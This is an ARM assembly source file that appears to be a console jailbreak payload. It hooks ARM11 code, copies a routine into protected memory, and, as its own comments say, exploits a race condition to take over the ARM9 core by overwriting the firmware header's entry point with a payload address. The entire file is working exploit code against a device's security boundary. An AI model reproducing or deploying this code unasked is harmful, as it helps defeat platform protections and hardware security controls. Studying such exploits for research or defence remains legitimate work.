.arm
.align 4
.code 32
.text

.global	arm11_start
arm11_start:
	b hook1
	b hook2

hook1:
	stmfd sp!, {r0-r12,lr}

	mov r0, #1000
	bl busy_spin

	mov r0, #0
	bl pxi_send	
	
	bl pxi_sync
	
	mov r0, #0x10000
	bl pxi_send
	
	bl pxi_recv
	bl pxi_recv
	bl pxi_recv

	mov r0, #2
	bl pdn_send

	mov r0, #16
	bl busy_spin

	mov r0, #0
	bl pdn_send

	mov r0, #16
	bl busy_spin

	ldmfd sp!, {r0-r12,lr}

	ldr r0, var_44836
	str r0, [r1]
	ldr pc, va_hook1_ret

	var_44836: .long 0x44836

@ copy hijack_arm9 routine and execute
hook2:
	adr r0, hijack_arm9
	adr r1, hijack_arm9_end
	ldr r2, pa_hijack_arm9_dst
	mov r4, r2
	bl copy_mem
	bx r4

@ exploits a race condition in order
@ to take control over the arm9 core
hijack_arm9:
	@ init
	ldr r0, pa_arm11_code 
	mov r1, #0 
	str r1, [r0]
	
	@ load physical addresses
	ldr r10, pa_firm_ncch
	ldr r9, pa_arm9_payload
	ldr r8, pa_io_mem
	
	@ send pxi cmd 0x44846
	ldr r1, pa_pxi_regs 
	ldr r2, some_pxi_cmd
	str r2, [r1, #8]

wait_arm9_loop:
	ldrb r0, [r8]
	ands r0, r0,	#1
	bne	wait_arm9_loop
	
	@ get arm9 orig entry point phys addr from FIRM header
	ldr r0, [r10, #0x0C]

	@ backup orig entry point to FCRAM + offs arm9 payload + 4
	str r0, [r9, #0x4]

	@ overwrite orig entry point with FCRAM addr
	@ this exploits the race condition bug
	str r9, [r10, #0x0C] 	

	ldr r0, pa_arm11_code
wait_arm11_loop:
	ldr	r1, [r0]
	cmp r1, #0  
	beq wait_arm11_loop
	bx r1

	pa_hijack_arm9_dst:  .long 0x1FFFFC00
	pa_arm11_code:       .long 0x1FFFFFFC
	pa_pxi_regs:         .long 0x10163000
	some_pxi_cmd:        .long 0x44846
	pa_firm_ncch:        .long 0x24000000
	pa_arm9_payload:     .long 0x23F00000
	pa_io_mem:           .long 0x10140000
	.align 4
hijack_arm9_end:

copy_mem:
	SUB             R3, R1, R0
	MOV             R1, R3,ASR#2
	CMP             R1, #0
	BLE             locret_FFFF0AC0
	MOVS            R1, R3,LSL#29
	SUB             R0, R0, #4
	SUB             R1, R2, #4
	BPL             loc_FFFF0AA0
	LDR             R2, [R0,#4]!
	STR             R2, [R1,#4]!
loc_FFFF0AA0:
	MOVS            R2, R3,ASR#3
	BEQ             locret_FFFF0AC0
loc_FFFF0AA8:
	LDR             R3, [R0,#4]
	SUBS            R2, R2, #1
	STR             R3, [R1,#4]
	LDR             R3, [R0,#8]!
	STR             R3, [R1,#8]!
	BNE             loc_FFFF0AA8
locret_FFFF0AC0:
	BX              LR


.align 4

busy_spin:
	subs r0, r0, #2
	nop
	bgt busy_spin
	bx lr 

pdn_send:
	ldr r1, va_pdn_regs
	strb r0, [r1, #0x230]
	bx lr
	
pxi_send:  
	LDR             R1, va_pxi_regs
loc_1020D0:
	LDRH            R2, [R1,#4]
	TST             R2, #2
	BNE             loc_1020D0
	STR             R0, [R1,#8]
	BX              LR

pxi_recv:
	LDR             R0, va_pxi_regs
loc_1020FC:                              
	LDRH            R1, [R0,#4]
	TST             R1, #0x100
	BNE             loc_1020FC
	LDR             R0, [R0,#0xC]
	BX              LR

pxi_sync:
	LDR             R0, va_pxi_regs
	LDRB            R1, [R0,#3]
	ORR             R1, R1, #0x40
	STRB            R1, [R0,#3]
	BX              LR

.global	arm11_end	
arm11_end:

.global arm11_globals_start
arm11_globals_start:

	va_pdn_regs:    .long 0
	va_pxi_regs:    .long 0
	va_hook1_ret:   .long 0

.global arm11_globals_end
arm11_globals_end: